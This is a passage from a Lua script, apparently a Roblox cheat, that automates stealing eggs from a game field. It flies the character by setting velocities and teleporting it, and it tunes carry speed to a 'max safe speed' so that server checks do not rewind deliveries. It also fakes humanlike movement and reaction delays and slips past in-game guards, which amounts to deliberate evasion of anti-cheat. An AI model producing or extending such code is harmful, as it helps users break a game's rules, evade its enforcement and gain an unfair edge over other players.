				while finalWaitTicks < 2 and safeCarry.LastDelivered < startTime and steal.Carrying and not shouldCancelSteal(sessionId) do
					finalWaitTicks += RunService.Heartbeat:Wait()
				end

				cleanupLineDrop()
				return safeCarry.LastDelivered >= startTime
			end

			chilliState.SafeCarry.Home = function(sessionId)
				local safeCarry = chilliState.SafeCarry
				local homePos = chilliState.StealHome()
				local rootPart = chilliState.Root()
				if not homePos or not rootPart then
					return false
				end
				stopFlightVelocity()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				local safeCarryBoundaryX = (world and world:IsA("BasePart") and world.Position.X or 552) - 7
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false
				end

				local startTime = os.clock()
				local carrySpeed = 0

				local function planSafeCarrySpeed()
					local currentRoot = chilliState.Root()
					if not currentRoot then
						return
					end
					local calcSpeed, isPlanOk, baseWait, targetWait, guardSpeed = safeCarry.Plan(chilliState.Steal.CarryAreaId, (Vector3.new(currentRoot.Position.X, 0, currentRoot.Position.Z) - Vector3.new(homePos.X, 0, homePos.Z)).Magnitude + math.max(0, safeCarry.Height) * 2, safeCarry.Mult)
					local plannedSpeed = calcSpeed * safeCarry.CarryScale
					carrySpeed = plannedSpeed
					safeCarry.PlanOk = isPlanOk
					safeCarry.FloorSpeed = safeCarry.BeatGuard and math.min(guardSpeed + math.max(safeCarry.GuardMargin, 1), targetWait) or 0
					actionStatus = string.format("Carrying home at %d (carry %d, guard %d, max %d)%s", math.floor(plannedSpeed + 0.5), math.floor(baseWait + 0.5), math.floor(guardSpeed + 0.5), math.floor(targetWait + 0.5), isPlanOk and "" or ", guard is faster, going at your max safe speed")
				end

				local function applySafeCarryHeight()
					local targetHeight = math.max(0, safeCarry.Height)
					local currentRoot = chilliState.Root()
					local character2 = localPlayer.Character
					if targetHeight <= 0.5 or not currentRoot or not character2 then
						return
					end
					local targetFlightY = homePos.Y + targetHeight
					if targetFlightY - 2 <= currentRoot.Position.Y then
						return
					end
					local rotation = currentRoot.CFrame.Rotation
					local targetCFrame = CFrame.new(Vector3.new(currentRoot.Position.X, targetFlightY, currentRoot.Position.Z)) * rotation

					pcall(function()
						character2:PivotTo(targetCFrame)
						currentRoot.AssemblyLinearVelocity = Vector3.zero
						currentRoot.AssemblyAngularVelocity = Vector3.zero
					end)
				end

				planSafeCarrySpeed()
				local humanProfile = safeCarry.NewHuman(true)
				local initialRoot = chilliState.Root()
				local laneZ = math.clamp((initialRoot and initialRoot.Position.Z or homePos.Z) + humanProfile.Lane, -425, -300)
				local lastMoveTime = os.clock()

				if safeCarry.CarryReact > 0 then
					local reactTime = os.clock() + safeCarry.React(0, safeCarry.CarryReact)

					while os.clock() < reactTime and not shouldCancelSteal(sessionId) do
						RunService.Heartbeat:Wait()
					end
				end

				local recoverAttempts = 0

				if safeCarry.CarryStyle ~= "Walk" then
					applySafeCarryHeight()
				end

				while not shouldCancelSteal(sessionId) do
					local innerRoot = chilliState.Root()
					if not innerRoot then
						return false
					end

					if not chilliState.Steal.Carrying then
						if startTime <= safeCarry.LastDelivered then
							return true
						end
						task.wait(0.1)
						if startTime <= safeCarry.LastDelivered then
							return true
						end

						if startTime <= safeCarry.LastFailed then
							actionStatus = "Delivery was rewound, too fast for your speed"
							return false
						end

						if not safeCarry.PlanOk and chilliState.Steal.CarryUid then
							safeCarry.Blocked[chilliState.Steal.CarryUid] = true
							actionStatus = string.format("The guard caught you with %s, it is faster than your max safe speed, skipping this egg", tostring(safeCarry.Category))
							return false
						end

						recoverAttempts += 1
						if safeCarry.RecoverTries < recoverAttempts then
							actionStatus = "The egg is gone"
							return false
						end
						actionStatus = "Egg dropped, taking it back"
						if not grabAndReturnToSafeZone(sessionId) then
							actionStatus = "Could not take the egg back"
							return false
						end
						local waitRagdollTicks = 0

						while isPlayerRagdolled() and waitRagdollTicks < 4 and not shouldCancelSteal(sessionId) do
							waitRagdollTicks += RunService.Heartbeat:Wait()
						end

						local nextStartTime = math.min(startTime, os.clock())
						planSafeCarrySpeed()

						if safeCarry.CarryStyle ~= "Walk" then
							applySafeCarryHeight()
						end

						innerRoot = chilliState.Root()
						if not innerRoot then
							return false
						end
						startTime = nextStartTime
					end

					local tickTime = os.clock()
					local dt = math.max(tickTime - lastMoveTime, 0.0041666666666666666)
					local isWalkStyle = safeCarry.CarryStyle == "Walk"
					local carryHeight = isWalkStyle and 0 or math.max(0, safeCarry.Height)
					local speedFactor, currentLaneOffset = humanProfile.Step(dt, carryHeight <= 0.5 and humanoid or nil, humanoid and humanoid.FloorMaterial ~= Enum.Material.Air)
					local clampedZ = math.clamp(laneZ + currentLaneOffset, -425, -300)
					local avoidTarget = innerRoot.Position.X > safeCarryBoundaryX + 2 and Vector3.new(safeCarryBoundaryX, innerRoot.Position.Y, clampedZ) or homePos
					local avoidPos, avoidObstacleName = safeCarry.Avoid(innerRoot.Position, avoidTarget)

					if not avoidObstacleName then
						avoidPos = avoidTarget
					end

					local dirToAvoidPosXZ = Vector3.new(avoidPos.X - innerRoot.Position.X, 0, avoidPos.Z - innerRoot.Position.Z)
					if dirToAvoidPosXZ.Magnitude < 2 and avoidPos == homePos then
						break
					end
					local currentSpeed = math.max(carrySpeed * speedFactor, safeCarry.FloorSpeed or 0)

					if os.clock() < (safeCarry.SlowUntil or 0) then
						currentSpeed *= safeCarry.SlowFactor
					end

					if isWalkStyle then
						pcall(function()
							if humanoid and dirToAvoidPosXZ.Magnitude > 0.01 then
								humanoid:MoveTo(innerRoot.Position + dirToAvoidPosXZ.Unit * math.min(dirToAvoidPosXZ.Magnitude, 30))
							end
						end)
					elseif carryHeight > 0.5 then
						local climbShare = math.clamp(safeCarry.ClimbShare, 0.1, 0.9)
						local homeY = homePos.Y
						local distFromSafeZone = math.max(0, innerRoot.Position.X - safeCarryBoundaryX)
						local climbDist = carryHeight * math.sqrt(1 - climbShare * climbShare) / climbShare
						local targetFlightHeight = homeY + carryHeight

						if avoidPos == homePos or distFromSafeZone <= climbDist then
							targetFlightHeight = homeY + carryHeight * math.clamp((avoidPos == homePos and 0 or distFromSafeZone) / math.max(climbDist, 1), 0, 1)
						end

						local flightYVel = math.clamp((targetFlightHeight - innerRoot.Position.Y) / 0.12, -currentSpeed * climbShare, currentSpeed * climbShare)
						local flightXZMaxVel = math.sqrt(math.max(currentSpeed * currentSpeed - flightYVel * flightYVel, 0))
						local flightXZVel = dirToAvoidPosXZ.Magnitude > 0.01 and dirToAvoidPosXZ.Unit * math.min(flightXZMaxVel, dirToAvoidPosXZ.Magnitude / 0.05) or Vector3.zero

						pcall(function()
							innerRoot.AssemblyLinearVelocity = Vector3.new(flightXZVel.X, flightYVel, flightXZVel.Z)
						end)
					else
						local walkXZVel = dirToAvoidPosXZ.Magnitude > 0.01 and dirToAvoidPosXZ.Unit * math.min(currentSpeed, dirToAvoidPosXZ.Magnitude / 0.05) or Vector3.zero

						pcall(function()
							innerRoot.AssemblyLinearVelocity = Vector3.new(walkXZVel.X, innerRoot.AssemblyLinearVelocity.Y, walkXZVel.Z)

							if safeCarry.RunAnimate and humanoid and dirToAvoidPosXZ.Magnitude > 0.01 then
								humanoid:Move(dirToAvoidPosXZ.Unit, false)
							end
						end)
					end

					RunService.Heartbeat:Wait()
					lastMoveTime = tickTime
				end

				if humanoid then
					pcall(function()
						local finalRoot = chilliState.Root()

						if safeCarry.CarryStyle == "Walk" and finalRoot then
							humanoid:MoveTo(finalRoot.Position)
						end

						humanoid:Move(Vector3.zero, false)
					end)
				end

				local finalWaitTicks = 0

				while finalWaitTicks < 2 and not shouldCancelSteal(sessionId) do
					if safeCarry.LastDelivered >= startTime then
						return true
					end

					if startTime <= safeCarry.LastFailed then
						actionStatus = "Delivery was rewound, too fast for your speed"
						return false
					end

					if not chilliState.Steal.Carrying then
						break
					end
					finalWaitTicks += RunService.Heartbeat:Wait()
				end

				if chilliState.Steal.Carrying then
					task.wait(0.2)
					local eggState = gameModules.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end
				end

				return safeCarry.LastDelivered >= startTime
			end

			local function returnHomeSequence(sessionId)
				local antiGuard = chilliState.AntiGuard

				if antiGuard.Enabled and not chilliState.SafeCarry.LineDrop then
					local waitStartTicks = 0

					while not antiGuard.Busy and waitStartTicks < 1 and not shouldCancelSteal(sessionId) do
						actionStatus = "Waiting for Anti Guard to start"
						waitStartTicks += RunService.Heartbeat:Wait()
					end

					local wasBusy = antiGuard.Busy
					local slipWaitTicks = 0

					while antiGuard.Busy and slipWaitTicks < 30 and not shouldCancelSteal(sessionId) do
						actionStatus = "Anti Guard is slipping past the guard"
						slipWaitTicks += RunService.Heartbeat:Wait()
					end

					if wasBusy then
						local finishWaitTicks = 0
						local idleWaitTicks = 0

						while finishWaitTicks < 10 and not shouldCancelSteal(sessionId) do
							local isRagdolled = isPlayerRagdolled()
							local hasEggOk, hasEggResult = pcall(chilliState.Steal.HeldByMe)
							hasEggOk = hasEggOk and hasEggResult == true
							local isNotRagdolled = not isRagdolled
							if isNotRagdolled and not hasEggOk then
								break
							end

							if isNotRagdolled and hasEggOk and not antiGuard.Busy then
								idleWaitTicks += RunService.Heartbeat:Wait()
								if not (idleWaitTicks >= 0.3) then
									continue
								end
								break
							end

							actionStatus = isRagdolled and "The guard hit you, waiting until you can move" or "Waiting for Anti Guard to finish"
							finishWaitTicks += RunService.Heartbeat:Wait()
							idleWaitTicks = 0
						end

						local hasEggOk2, hasEggResult2 = pcall(chilliState.Steal.HeldByMe)

						if hasEggOk2 and not hasEggResult2 then
							chilliState.Steal.Carrying = false
						end

						local safeCarry = chilliState.SafeCarry
						local homePos = chilliState.StealHome()
						local riseHeight = homePos and safeCarry.Enabled and safeCarry.CarryStyle ~= "Walk" and safeCarry.Height > 0.5 and homePos.Y + safeCarry.Height or nil
						local riseWaitTicks = 0

						while riseWaitTicks < 0.8 and chilliState.Steal.Carrying and not shouldCancelSteal(sessionId) do
							actionStatus = riseWaitTicks < 0.6 and "Anti Guard done, rising up" or "Anti Guard done, getting ready"
							local currentRoot = chilliState.Root()

							if currentRoot and riseHeight then
								local yDiff = riseHeight - currentRoot.Position.Y
								local riseVel = riseWaitTicks < 0.6 and math.clamp(yDiff / math.max(0.6 - riseWaitTicks, 0.1), -120, 120) or math.clamp(yDiff / 0.2, -30, 30)

								pcall(function()
									currentRoot.AssemblyLinearVelocity = Vector3.new(0, riseVel, 0)
								end)
							end

							riseWaitTicks += RunService.Heartbeat:Wait()
						end

						local hasEggOk3, hasEggResult3 = pcall(chilliState.Steal.HeldByMe)

						if hasEggOk3 and not hasEggResult3 then
							chilliState.Steal.Carrying = false
						else
							chilliState.SafeCarry.SlowUntil = os.clock() + 2
						end
					end
				end

				local waitEggTicks = 0

				while not chilliState.Steal.Carrying and waitEggTicks < maxInteractDistance and not shouldCancelSteal(sessionId) do
					actionStatus = "Checking the egg in hand"
					waitEggTicks += RunService.Heartbeat:Wait()
				end

				if not chilliState.Steal.Carrying then
					actionStatus = "The egg is gone, staying to look for it"
					if not grabAndReturnToSafeZone(sessionId) then
						actionStatus = "The egg is gone"
						return false
					end
				end

				if chilliState.SafeCarry.LineDrop then
					return chilliState.SafeCarry.LineDropHome(sessionId)
				end

				if chilliState.SafeCarry.Enabled then
					return chilliState.SafeCarry.Home(sessionId)
				end
				local homePos = chilliState.StealHome()
				local currentRoot = chilliState.Root()
				if not homePos or not currentRoot then
					return false
				end
				local flyHeight = math.max(currentRoot.Position.Y, homePos.Y) + speedLimit

				local function checkPriorityEgg()
					if priorityFreedEgg.Uid and priorityFreedEgg.Freed and chilliState.Steal.Carrying then
						return "priority"
					end
					return nil
				end

				local smoothFly = true
				local flyAttempts = 0

				while true do
					local innerRoot = chilliState.Root()

					if not innerRoot then
						return false
					else
						actionStatus = "Flying home"
						local pos = innerRoot.Position
						local targetY = math.max(flyHeight, pos.Y)
						local flySuccess, flyResult = flyToPosition(Vector3.new(pos.X + (homePos.X - pos.X) * 0.25, pos.Y + (targetY - pos.Y) * 0.7, pos.Z + (homePos.Z - pos.Z) * 0.25), sessionId, smoothFly, nil, nil, checkPriorityEgg)

						if flySuccess then
							flySuccess, flyResult = flyToPosition(Vector3.new(homePos.X, targetY, homePos.Z), sessionId, smoothFly, nil, nil, checkPriorityEgg)
						end

						if flySuccess then
							flySuccess, flyResult = flyToPosition(homePos, sessionId, smoothFly, nil, nil, checkPriorityEgg)
						end

						if flySuccess then
							local character = localPlayer.Character
							character = character and character:FindFirstChildOfClass("Humanoid")

							if character then
								character.PlatformStand = false
							end

							task.wait(0.2)
							if not chilliState.Steal.Carrying then
								actionStatus = "Arrived without the egg"
								return false
							end
							local eggState = gameModules.EggState

							if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
								pcall(eggState.DropFieldEgg, "PlayerRequest")
							end

							return true
						end

						if flyResult == "priority" then
							local priorityUid = priorityFreedEgg.Uid
							local priorityPos = priorityFreedEgg.Freed
							local priorityData = priorityFreedEgg
							priorityFreedEgg.Uid = nil
							priorityData.Freed = nil
							local flightRoot = chilliState.Root()
							if not flightRoot or not priorityUid or not priorityPos then
								return false
							end

							if (priorityPos - flightRoot.Position).Magnitude <= distanceMax * priorityArrivalMultiplier then
								actionStatus = "Best egg fell nearby, swapping eggs"
								local eggState = gameModules.EggState

								if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
									pcall(eggState.DropFieldEgg, "PlayerRequest")
								end

								local swapWaitTicks = 0

								while chilliState.Steal.Carrying and swapWaitTicks < 1 do
									swapWaitTicks += RunService.Heartbeat:Wait()
								end

								if not grabAndReturnToSafeZone(sessionId, priorityUid) then
									return false
								end
							else
								actionStatus = "Best egg fell far away, riding a guard hit to it"
								if not rideGuardHitToPosition(sessionId, priorityUid, priorityPos) then
									return false
								end
							end

							local innerRoot2 = chilliState.Root()
							flyAttempts = 0

							if innerRoot2 then
								flyHeight = math.max(innerRoot2.Position.Y, homePos.Y) + speedLimit
							end

							continue
						end

						if flyResult == "dropped" and flyAttempts < math.huge then
							flyAttempts += 1
							if not grabAndReturnToSafeZone(sessionId) then
								return false
							end
							continue
						end

						break
					end
				end

				return false
			end

			local function formatNumber(value)
				local num = tonumber(value) or 0
				local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local index = 1

				while math.abs(num) >= 1000 and index < #suffixes do
					num /= 1000
					index += 1
				end

				return string.format(index == 1 and "%.0f%s" or "%.2f%s", num, suffixes[index])
			end

			local function formatEggInfo(targetData)
				if not targetData then
					return "None"
				end
				local format = string.format
				local categoryStr = tostring(targetData.Category)
				local scale = tonumber(targetData.Scale) or 0
				local toStringFn = tostring
				local areaId = targetData.AreaId
				local baseStr = format("%s  %.2fx  |  value %s  |  %s", categoryStr, scale, formatNumber(targetData.Value), toStringFn(areaId))
				local finalStr

				if targetData.State == "Dropped" then
					finalStr = baseStr .. "  |  dropped"
				elseif targetData.State == "Carried" then
					finalStr = baseStr .. "  |  carried by a player"
				else
					finalStr = baseStr
				end

				return finalStr
			end

			local isStealActiveState = false
			local stealVal1 = 0.5
			local stealVal2 = 0.6
			local stealVal3 = 0
			local stealVal4 = 0

			local function stealLoopTick()
				local sessionId = stealSessionId
				chilliState.Steal.Active = true
				chilliState.Steal.Carrying = chilliState.Steal.Carrying == true

				if not chilliState.Steal.Carrying then
					chilliState.Steal.CarryUid = nil
				end

				local availableEggs = getWantedEggs(false, true)
				local bestEgg = nil
				local carriedEggTarget = nil
				local lastSkipReason = nil

				for _, eggData in ipairs(availableEggs) do
					if eggData.State == "Carried" then
						carriedEggTarget = carriedEggTarget or eggData
					else
						local unsafeReason = chilliState.SafeCarry.Unsafe(eggData)

						if unsafeReason then
							lastSkipReason = lastSkipReason or unsafeReason
						else
							bestEgg = eggData
							break
						end
					end
				end

				local eggList = { bestEgg }
				local uid = bestEgg and bestEgg.Uid or nil
				targetUid = uid
				chilliState.Steal.Wanted = bestEgg ~= nil
				str = formatEggInfo(bestEgg)

				if carriedEggTarget then
					str ..= "  |  watching " .. tostring(carriedEggTarget.Category)
				end

				if not bestEgg then
					chilliState.Steal.Active = false
					lastSkipReason = lastSkipReason or chilliState.SafeCarry.LastSkip
					chilliState.SafeCarry.LastSkip = nil
					actionStatus = carriedEggTarget and "Best egg is carried, waiting for it" or lastSkipReason and "Skipped: " .. lastSkipReason or "No egg matches"
					return false
				end

				if not chilliState.ClaimMovement("steal") then
					chilliState.Steal.Active = false
					actionStatus = "Waiting for Auto Place"
					return false
				end

				if chilliState.Treadmill.Riding or chilliState.OnBelt() then
					chilliState.ExitBelt()
				end

				isStealActiveState = true
				chilliState.HoldBelt()

				local function takeTargetDirectly(statusMsg)
					actionStatus = statusMsg
					local didGrab = flyAndGrabEgg(bestEgg, sessionId)
					local didDeliver = false
					local tempStatus = nil

					if didGrab then
						if verifyEggHeld(bestEgg.Uid, sessionId) then
							didDeliver = returnHomeSequence(sessionId)
							tempStatus = nil
						else
							tempStatus = actionStatus
						end
					end

					cleanupSteal()
					chilliState.Steal.Active = false
					chilliState.Steal.LastFinishedAt = os.clock()
					tempStatus = didDeliver and "Delivered" or tempStatus
					local finalStatus

					if tempStatus then
						finalStatus = tempStatus
					else
						finalStatus = didGrab and "Run ended" or "That egg would not come free"
					end

					actionStatus = finalStatus
					return true
				end

				local currentRoot = chilliState.Root()
				local eggPos = typeof(bestEgg.CFrame) == "CFrame" and bestEgg.CFrame.Position or nil

				if currentRoot and eggPos then
					local isClose = (eggPos - currentRoot.Position).Magnitude <= stealTargetMaxDist
					local areaId = bestEgg.AreaId
					local isSameArea = localPlayer:GetAttribute("AreaId") == areaId
					if isClose or isSameArea then
						return (takeTargetDirectly("Target is right here, taking it"))
					end
				end

				if chilliState.SafeCarry.Enabled and chilliState.SafeCarry.Approach == "Run" then
					local runResult = chilliState.SafeCarry.RunTo(bestEgg, sessionId)
					local didDeliverRun, tempStatusRun

					if runResult then
						if verifyEggHeld(bestEgg.Uid, sessionId) then
							didDeliverRun = returnHomeSequence(sessionId)
							tempStatusRun = nil
						else
							tempStatusRun = actionStatus
							didDeliverRun = false
						end
					else
						eggCooldowns[bestEgg.Uid] = os.clock() + stealCooldown
						tempStatusRun = nil
						didDeliverRun = false
					end

					cleanupSteal()
					chilliState.Steal.Active = false
					chilliState.Steal.LastFinishedAt = os.clock()
					actionStatus = didDeliverRun and "Delivered" or tempStatusRun or runResult and "Run ended" or "That egg would not come free"
					return true
				end

				local visibleEggs = getWantedEggs(true)
				local firstAreaEggPrefix = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local filteredEggs = {}

				for _, eggData in ipairs(visibleEggs) do
					if isGuardSleeping(eggData) or type(eggData.Uid) == "string" and string.sub(eggData.Uid, 1, #firstAreaEggPrefix) == firstAreaEggPrefix then
						table.insert(filteredEggs, eggData)
					end
				end

				if #filteredEggs ~= 0 then
					visibleEggs = filteredEggs
				end

				local closestEgg, closestDist = getClosestTarget(visibleEggs)

				if not closestEgg then
					chilliState.Steal.Active = false
					actionStatus = "No egg matches"
					return false
				end

				if closestEgg.Uid == bestEgg.Uid then
					return (takeTargetDirectly("Target is the closest egg, taking it"))
				end
				local guardModel, guardPos = getSafeBypassPos(closestEgg)
				local targetEgg

				if guardPos and currentRoot then
					local minDist = math.huge
					targetEgg = closestEgg

					for _, eggCandidate in ipairs(visibleEggs) do
						local candidatePos = typeof(eggCandidate.CFrame) == "CFrame" and eggCandidate.CFrame.Position or nil

						if eggCandidate.Uid ~= bestEgg.Uid and eggCandidate.AreaId == closestEgg.AreaId and candidatePos then
							local magnitude = (candidatePos - currentRoot.Position).Magnitude

							if stealBaseTweenSpeed < (candidatePos - guardPos).Magnitude then
								magnitude += stealBaseTweenSpeed
							end

							if magnitude < minDist then
								minDist = magnitude
								targetEgg = eggCandidate
							end
						end
					end
				else
					targetEgg = closestEgg
				end

				actionStatus = string.format("Sleeping guard egg %d studs away", math.floor(closestDist + 0.5))

				if not targetEgg then
					chilliState.Steal.Active = false
					actionStatus = "No egg matches"
					return false
				end

				local stealSuccess, guardHitSignal = stealTargetEgg(targetEgg, sessionId, false, eggList[1])
				if not stealSuccess then
					chilliState.Steal.Active = false
					return false
				end
				local priorityUid = nil
				local finalTargetUid = bestEgg.Uid
				local eggIndex = 0

				while true do
					if guardHitSignal and not shouldCancelSteal(sessionId) then
						actionStatus = "Holding for the guard hit"

						if waitAntiGuardLanded(sessionId, guardHitSignal, function(hitState)
							if not priorityUid and priorityFreedEgg.Uid and priorityFreedEgg.Freed then
								priorityUid = priorityFreedEgg.Uid
								hitState.Destination = priorityFreedEgg.Freed + Vector3.new(0, 3, 0)
								local priorityData = priorityFreedEgg
								priorityFreedEgg.Uid = nil
								priorityData.Freed = nil
								actionStatus = "Best egg fell, jumping to it instead"
							end
						end) then
							eggIndex += 1

							if priorityUid then
								finalTargetUid = priorityUid
								grabAndReturnToSafeZone(sessionId, priorityUid)
								break
							else
								local nextEggData = eggList[eggIndex]
								local nextStealSuccess
								nextStealSuccess, guardHitSignal = stealTargetEgg(nextEggData, sessionId, true, eggList[eggIndex + 1])

								if nextStealSuccess then
									if nextEggData and type(nextEggData.Uid) == "string" then
										finalTargetUid = nextEggData.Uid
									end

									continue
								end
							end
						end
					end

					break
				end

				if not verifyEggHeld(finalTargetUid, sessionId) then
					local finalActionStatus = actionStatus
					cleanupSteal()
					chilliState.Steal.Active = false
					chilliState.Steal.LastFinishedAt = os.clock()
					actionStatus = finalActionStatus
					return true
				end

				local didDeliverFinal = returnHomeSequence(sessionId)
				cleanupSteal()
				chilliState.Steal.Active = false
				chilliState.Steal.LastFinishedAt = os.clock()
				actionStatus = didDeliverFinal and "Delivered" or "Run ended"
				return true
			end

			local eggState = gameModules.EggState

			if type(eggState) == "table" then
				for _, eventName in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "SnapshotRefreshed" }) do
					local eventSignal = eggState[eventName]

					if type(eventSignal) == "table" and type(eventSignal.Connect) == "function" then
						local ok, connection = pcall(eventSignal.Connect, eventSignal, function()
							taskScheduler.Wake()
						end)

						if ok and connection then
							trackCleanup(function()
								pcall(function()
									connection:Disconnect()
								end)
							end)
						end
					end
				end
			end

			taskScheduler.Add(function()
				local hasStatusSet = nil

				if activeAction then
					hasStatusSet = type(activeAction.Set) == "function"
				end

				if hasStatusSet then
					pcall(activeAction.Set, nil, actionStatus)
				end

				local hasTargetSet = nil

				if activeTarget then
					hasTargetSet = type(activeTarget.Set) == "function"
				end

				if hasTargetSet then
					pcall(activeTarget.Set, nil, targetName)
				end

				if not chilliState.Toggle(autoStealToggleObj, false) then
					return false
				end
				local isFieldResetting, reason, resetStart = getNightOrWallWaitTime()

				if isFieldResetting then
					if reason == "night" then
						forceEggSearch()
					end

					chilliState.Movement.StealFirst = true
					chilliState.Steal.Wanted = false

					if isStealActiveState then
						stealSessionId += 1
						chilliState.Steal.Active = false
						cleanupSteal()
						chilliState.StopWalking()
					end

					local timeToWait = math.max(0, math.ceil(isFieldResetting - resetStart))

					if reason == "wall" then
						actionStatus = string.format("Field wall up, %ds", timeToWait)
					else
						actionStatus = string.format("Night, going again in %ds", timeToWait)
					end

					return false
				end

				if currentTargetData and lastSearchTime == math.huge then
					lastSearchTime = os.clock() + stealRadius
				end

				if isStealActiveState then
					return true
				end

				if checkTargetValidity() then
					actionStatus = "Night over, waiting for the field to reset"
					taskScheduler.Wake()
					return false
				end

				local stealFirst = chilliState.Movement.StealFirst
				local owner = chilliState.Movement.Owner
				local canStealNow = chilliState.Movement.PlaceWanted and not stealFirst

				if not canStealNow then
					canStealNow = owner ~= nil and owner ~= "steal" and owner ~= "treadmill" and owner ~= "scramble"
				end

				if canStealNow then
					if os.clock() >= stealVal3 then
						stealVal3 = os.clock() + stealVal1
						local ok, result = pcall(getWantedEggs, false, false)
						ok = ok and type(result) == "table" and result[1] ~= nil
						chilliState.Steal.Wanted = ok

						if ok then
							chilliState.Movement.StealFirst = true
						end
					end

					if chilliState.Steal.Wanted then
						local tostr = tostring
						owner = owner or "Auto Place"
						actionStatus = "Egg found, waiting for " .. tostr(owner) .. " to stop"
					else
						actionStatus = "Waiting for " .. tostring(owner or "Auto Place")
					end

					return true
				end

				if os.clock() < stealVal4 then
					return true
				end
				chilliState.Movement.StealFirst = false
				isAutoStealRunning = true

				task.spawn(function()
					local ok = pcall(stealLoopTick)

					if isStealActiveState then
						isStealActiveState = false
						chilliState.ReleaseBelt()
					end

					if not ok then
						cleanupSteal()
						chilliState.Steal.Active = false
					end

					local currentUid = targetUid
					targetUid = nil
					local eggPlan = currentUid and stealPlanQueue[currentUid]

					if eggPlan and eggPlan.Once then
						stealPlanQueue[currentUid] = nil
					end

					local priorityClear1 = priorityFreedEgg
					local priorityClear2 = priorityFreedEgg
					priorityFreedEgg.Uid = nil
					priorityClear1.Freed = nil
					priorityClear2.Token = nil

					if actionStatus == "Delivered" and not chilliState.IsNight() then
						chilliState.Movement.StealFirst = true
					end

					if not chilliState.Steal.Wanted then
						stealVal4 = os.clock() + stealVal2
					end

					chilliState.ReleaseMovement("steal")
					isAutoStealRunning = false
					taskScheduler.Wake()
				end)

				return true
			end)
		end

		autoStealToggleObj = autoStealToggle

		cleanupAutoSteal = function()
			stealSessionId += 1
			table.clear(targetList)
			chilliState.Steal.Active = false
			chilliState.Steal.Wanted = false
			local autoStealOn = chilliState.Toggle(autoStealToggleObj, false)
			chilliState.Shield("steal", autoStealOn)

			if not autoStealOn then
				chilliState.Movement.StealFirst = false
				table.clear(targetSpecificEggs)
				table.clear(ignoredSpecificEggs)
				table.clear(blockedEggsList)
			end

			cleanupSteal()
			chilliState.StopWalking()
			taskScheduler.Wake()
		end
		updateAutoStealState = cleanupAutoSteal

		do
			local function restartStealSession()
				stealSessionId += 1
				chilliState.Steal.Active = false
				cleanupSteal()
				chilliState.StopWalking()
			end

			local function ensureAutoStealOn()
				if chilliState.Toggle(autoStealToggleObj, false) then
					return true
				end

				if autoStealToggleObj and type(autoStealToggleObj.Set) == "function" then
					pcall(autoStealToggleObj.Set, autoStealToggleObj, true)
				end

				return false
			end

			chilliState.CancelSteal = function(uidArg)
				if type(uidArg) ~= "string" then
					return
				end
				stealPlanQueue[uidArg] = nil
				stealPlanSet[uidArg] = nil
				stealPlanCancel[uidArg] = true

				if isAutoStealRunning and targetUid == uidArg then
					restartStealSession()
				end

				taskScheduler.Wake()
			end

			chilliState.StealQueue = function()
				local queue = {}

				for k in pairs(stealPlanQueue) do
					table.insert(queue, k)
				end

				table.sort(queue, function(uid1, uid2)
					local at = stealPlanQueue[uid1].At
					local at2 = stealPlanQueue[uid2].At
					if at ~= at2 then
						return at < at2
					end
					return uid1 < uid2
				end)

				return queue
			end

			chilliState.PrioritizeSteal = function(uidArg)
				if type(uidArg) ~= "string" or isNightCheck() then
					return
				end
				local minAt = 0

				for _, planData in pairs(stealPlanQueue) do
					if planData.At < minAt then
						minAt = planData.At
					end
				end

				stealPlanQueue[uidArg] = { At = minAt - 1, Once = false }
				stealPlanCancel[uidArg] = nil
				eggCooldowns[uidArg] = nil

				if ensureAutoStealOn() and isAutoStealRunning and not chilliState.Steal.Carrying and targetUid ~= uidArg then
					restartStealSession()
				end

				taskScheduler.Wake()
			end

			chilliState.MoveInPlan = function(uidArg, dir)
				if type(uidArg) ~= "string" or dir ~= -1 and dir ~= 1 or isNightCheck() then
					return
				end
				local plan = chilliState.StealPlan()
				local currentIndex = table.find(plan, uidArg)
				local newIndex = currentIndex and currentIndex + dir
				if not newIndex or newIndex < 1 or newIndex > #plan then
					return
				end
				table.remove(plan, currentIndex)
				table.insert(plan, newIndex, uidArg)
				local maxIndex = math.max(currentIndex, newIndex)

				for i, planUid in ipairs(plan) do
					if i <= maxIndex or stealPlanQueue[planUid] then
						local planData = stealPlanQueue[planUid]

						if planData then
							planData.At = i
						else
							stealPlanQueue[planUid] = { At = i, Once = false }
						end

						stealPlanCancel[planUid] = nil
					end
				end

				if isAutoStealRunning and not chilliState.Steal.Carrying and targetUid and plan[1] ~= targetUid then
					restartStealSession()
				end

				taskScheduler.Wake()
			end

			chilliState.StealPlan = function()
				if not chilliState.Toggle(autoStealToggleObj, false) or chilliState.IsNight() then
					return {}, nil
				end
				local planList = {}

				if targetUid then
					table.insert(planList, targetUid)
				end

				local ok, result = pcall(getWantedEggs, false, true)

				if ok and type(result) == "table" then
					for _, eggData in ipairs(result) do
						if eggData.Uid ~= targetUid then
							table.insert(planList, eggData.Uid)
						end
					end
				end

				return planList, targetUid
			end

			chilliState.SetPriority = function(uid, isPriority)
				if isPriority then
					chilliState.PrioritizeSteal(uid)
				else
					chilliState.CancelSteal(uid)
				end
			end

			chilliState.ResortSteal = function()
				if isAutoStealRunning and not chilliState.Steal.Carrying and targetUid and not stealPlanQueue[targetUid] then
					local ok, result = pcall(getWantedEggs, false, true)

					if ok and type(result) == "table" then
						local firstEgg = nil

						for _, eggData in ipairs(result) do
							if eggData.State ~= "Carried" then
								firstEgg = eggData
								break
							else
								firstEgg = nil
							end
						end

						if not firstEgg or firstEgg.Uid ~= targetUid then
							restartStealSession()
						end
					end
				end

				taskScheduler.Wake()
			end

			chilliState.StealNow = function(uidArg, once)
				if type(uidArg) ~= "string" or isNightCheck() then
					return
				end

				if not stealPlanQueue[uidArg] then
					local maxAt = 0

					for _, planData in pairs(stealPlanQueue) do
						if maxAt < planData.At then
							maxAt = planData.At
						end
					end

					stealPlanQueue[uidArg] = { At = maxAt + 1, Once = once == true }
				end

